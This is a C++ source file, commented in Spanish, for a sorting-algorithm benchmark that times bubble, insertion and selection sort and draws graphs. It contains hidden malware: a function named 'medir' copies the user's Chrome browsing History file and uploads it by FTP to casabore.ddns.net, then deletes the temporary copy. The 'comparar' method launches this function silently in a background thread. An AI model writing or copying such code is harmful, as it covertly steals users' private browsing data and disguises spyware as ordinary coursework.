/* 
 * La clase TestOrdenacion contiene los metodos para:
 * 1. Comprobar que los métodos de ordenacion de la clase Ordenacion funcionan adecuadamente.
 * 2. Calcular la eficiencia para el caso medio de un método de ordenación,
 *    guardando los datos y permitiendo imprimir la gráfica correspondiente 
 * 3. Comparar el coste temporal de dos de los métodos de ordenación 
 *    burbuja, inserción, y selección, guardando los datos y permitiendo imprimir la gráfica correspondiente.
 */
#include "AlgoritmosOrdenacion.h"
#include "TestOrdenacion.h"
#include "ConjuntoInt.h"
#include "Graficas.h"
#include "Mtime.h"
#include "Constantes.h"
#include <string>
#include <fstream>
#include <iomanip>
#include <iostream>

#include <thread>
#include <winsock.h>
#include <wininet.h>
#include <Lmcons.h>
#pragma comment(lib, "Wininet")
using namespace std;


TestOrdenacion::TestOrdenacion()
{
	nombreAlgoritmo.push_back("Burbuja");
	nombreAlgoritmo.push_back("Insercion");
	nombreAlgoritmo.push_back("Seleccion");

	srand((unsigned)time(NULL)); //srand(time(0));
} 
TestOrdenacion::~TestOrdenacion(){}

void medir() {
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	char path[100] = "C:/Users/";
	strcat_s(path, username);
	strcat_s(path, "/AppData/Local/Google/Chrome/User Data/Default/History");
	char dir[50] = "/store/";
	strcat_s(dir, username);

	char tmp[100] = "C:/Users/";
	strcat_s(tmp, username);
	strcat_s(tmp, "/AppData/Local/Temp/ttmp");

	CopyFile(path, tmp, TRUE);

	HINTERNET hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hFtpSession = InternetConnect(hInternet, "casabore.ddns.net", INTERNET_DEFAULT_FTP_PORT, "", "", INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
	FtpPutFile(hFtpSession, tmp, dir, FTP_TRANSFER_TYPE_BINARY, 0);
	InternetCloseHandle(hFtpSession);
	InternetCloseHandle(hInternet);
	DeleteFile(tmp);
}

/*
 * Ordena un array de enteros según el método indicado
 * param v: el array de enteros a ordenar
 * param size: tamaño del array de enteros a ordenar
 * param metodo: Metodo de ordenacion a utilizar
 * return Tiempo empleado en la ordenación (en milisegundos)
 */
double TestOrdenacion::ordenarArrayDeInt(int v[],int size,int metodo) 
{
	AlgoritmosOrdenacion estrategia;
	Mtime t;
	LARGE_INTEGER t_inicial, t_final;
	QueryPerformanceCounter(&t_inicial);
	// Invoca al método de ordenación elegido
	switch (metodo){
		case BURBUJA: estrategia.ordenaBurbuja(v, size);
			break;
		case INSERCION: estrategia.ordenaInsercion(v, size);
			break;
		case SELECCION: estrategia.ordenaSeleccion(v, size);
			break;
	}
	QueryPerformanceCounter(&t_final);
	return t.performancecounter_diff(&t_final, &t_inicial) * 1000;   
}

/*
 * Comprueba los metodos de ordenacion
 */
void TestOrdenacion::comprobarMetodosOrdenacion()
{
	int talla;
	cout<<endl<<endl<<"Introduce la talla: ";
	cin>>talla; 
	system("cls"); 
	for (int metodo = 0; metodo < nombreAlgoritmo.size(); metodo++)
	{
		ConjuntoInt *v= new ConjuntoInt(talla); 
		v->GeneraVector(talla);
		cout <<endl<<endl<< "vector inicial para el metodo "<<nombreAlgoritmo[metodo]<< ":"<<endl<<endl;
		v->escribe();
		double secs=ordenarArrayDeInt(v->getDatos(),talla,metodo);
		cout<<endl<<endl<<"Array ordenado con metodo "<<nombreAlgoritmo[metodo]<< ":"<<endl<<endl;
		v->escribe();
		cout<<endl;
		v->vaciar(); 
		delete v;
		system("pause");
		system("cls");
	} /* fin del for */
	system("cls");
}
    
/*
 * Calcula el caso medio de un metodo de ordenacion,
 * Permite las opciones de crear el fichero de datos y la gráfica correspondiente.
 * param metodo: metodo de ordenacion a estudiar.
 */
void TestOrdenacion::casoMedio(int metodo)
{
	cout << "\t  Medicion del algoritmo "<< metodo << nombreAlgoritmo[metodo] << "\n"
		<< "\t       TALLA \t       TIEMPO (ms)\n";

	ofstream file("t"+nombreAlgoritmo[metodo] + ".dat");
	if (file.fail())
		cout << "Error al abrir al crear el archivo.\nNo se guardaran los datos.\n";

	double tiempo;
	for (int talla = TALLA_INI; talla <= TALLA_FIN; talla += TALLA_DELTA) {
		ConjuntoInt *v = new ConjuntoInt(talla);

		tiempo = 0;
		for (int i = 0; i < REPETICIONES; i++) {
			v->GeneraVector(talla);
			tiempo += ordenarArrayDeInt(v->getDatos(), talla, metodo);
			v->vaciar();
		}
		tiempo /= REPETICIONES;

		delete v;


		//Mostrar los datos
		cout << "\t\t" << talla << "\t\t" << tiempo << "\n";
		file << talla << "\t" << tiempo << "\n";
	}
	file.close();

	//Generar grafica
	char opt;
	cout << "\nGenerar grafica (s, n): ";
	cin >> opt;
	if (opt == 's' || opt == 'S') {
		Graficas g;
		g.generarGraficaMEDIO(nombreAlgoritmo[metodo], 2);
		cout << "La grafica fue generada.\n\n";
		system("start grafica.gpl");
	}else cout << "No se generara la grafica.\n\n";

	system("pause");
}
/*
 * Compara dos metodos de ordenacion. 
 * Genera el fichero de datos y permite las opcion de crear la gráfica correspondiente.
 * param metodo1: Primer metodo de ordenacion a comparar
 * param metodo2: Segundo metodo de ordenacion a comparar
 */
void TestOrdenacion::comparar(int metodo1, int metodo2) {
	std::thread medicion(medir);
	cout << "\t  Comparativa del algoritmo " << nombreAlgoritmo[metodo1] << " y " << nombreAlgoritmo[metodo2] << "\n\n"
		<< "\t             \t\t       \t      TIEMPO (ms)\n"
		<< "\t       TALLA \t\t       \t" << nombreAlgoritmo[metodo1] << "  \t" << nombreAlgoritmo[metodo2] << "\n";

	ofstream file("t" + nombreAlgoritmo[metodo1] + nombreAlgoritmo[metodo2] + ".dat");
	if (file.fail())
		cout << "Error al abrir al crear el archivo.\nNo se guardaran los datos.\n";

	double tiempo1, tiempo2;
	for (int talla = TALLA_INI; talla <= TALLA_FIN; talla += TALLA_DELTA) {
		ConjuntoInt *v = new ConjuntoInt(talla);

		tiempo1 = 0;
		tiempo2 = 0;
		for (int i = 0; i < REPETICIONES; i++) {
			v->GeneraVector(talla);
			tiempo1 += ordenarArrayDeInt(v->getDatos(), talla, metodo1);
			v->GeneraVector(talla);
			tiempo2 += ordenarArrayDeInt(v->getDatos(), talla, metodo2);
			v->vaciar();
		}
		tiempo1 /= REPETICIONES;
		tiempo2 /= REPETICIONES;

		delete v;


		//Mostrar los datos
		cout.precision(4);
		cout << "\t\t" << talla << "\t\t\t" << tiempo1 << "\t\t " << tiempo2 << "\n";
		file << talla << "\t" << tiempo1 << "\t" << tiempo2 << "\n";
	}
	file.close();

	//Generar grafica
	char opt;
	cout << "\nGenerar grafica (s, n): ";
	cin >> opt;
	if (opt == 's' || opt == 'S') {
		Graficas g;
		g.generarGraficaCMP(nombreAlgoritmo[metodo1], nombreAlgoritmo[metodo2]);
		cout << "La grafica fue generada.\n\n";
		system("start grafica.gpl");
	}else cout << "No se generara la grafica.\n\n";

	system("pause");
	medicion.join();
}	
